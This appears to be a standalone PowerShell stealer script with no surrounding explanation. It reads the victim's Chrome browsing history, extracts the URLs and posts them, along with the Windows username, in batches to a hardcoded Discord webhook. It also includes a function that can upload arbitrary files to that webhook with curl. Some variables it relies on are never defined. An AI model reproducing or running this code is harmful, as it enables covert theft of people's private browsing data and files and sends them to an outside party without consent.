function Upload-Discord {

[CmdletBinding()]
param (
    [parameter(Position=0,Mandatory=$False)]
    [string]$file,
    [parameter(Position=1,Mandatory=$False)]
    [string]$text 
)

$hookurl = 'https://discord.com/api/webhooks/1060730183100944485/gwytSOpLHKXYSM2mCoWFXPKr0a3G11LGi0rOlLdKOcfpGkHMJZHeTaYR0mKotp9uYA9e'

$Body = @{
  'username' = $env:username
  'content' = $text
}

if (-not ([string]::IsNullOrEmpty($text))){
Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};

if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
}

$Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'
$Path = "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
$Value = Get-Content -Path $Path | Select-String -AllMatches $regex |% {($_.Matches).Value} |Sort -Unique
$array = New-Object Collections.Generic.List[String]
$counter = 0
Upload-Discord -text $env:UserName
$Value | ForEach-Object {
	$counter += 1
	$Key = $_
	if ($Key -match $Search){
		$array.Add($_)
		New-Object -TypeName PSObject -Property @{
			User = $env:UserName
			Browser = $Browser
			DataType = $DataType
			Data = $_
		}
		if ($counter -eq 50){
			$counter = 0
			Upload-Discord -text $array
			$array = New-Object Collections.Generic.List[String]
		}
		
	
	}
	
}
Upload-Discord -text $array
